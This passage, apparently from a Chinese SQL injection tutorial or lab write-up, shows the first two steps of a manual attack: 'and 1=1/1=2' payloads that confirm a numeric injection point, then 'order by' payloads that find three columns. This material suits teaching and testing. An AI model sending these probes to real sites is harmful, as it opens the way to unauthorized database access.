01 判断有无注入点

  • ?id=1 and 1=1 → 页面正常返回值

  • ?id=1 and 1=2 → 无返回值

通过以上Payload判断存在注入点,且为数字型

02 猜解列数

  • ?id=1 order by 1 → 正常
  • ?id=1 order by 2 → 正常
  • ?id=1 order by 3 → 正常
  • ?id=1 order by 4 → 报错 Unknown column ‘4’ in ‘order clause’

通过以上Payload可知,当前查询涉及的表共有 3 列
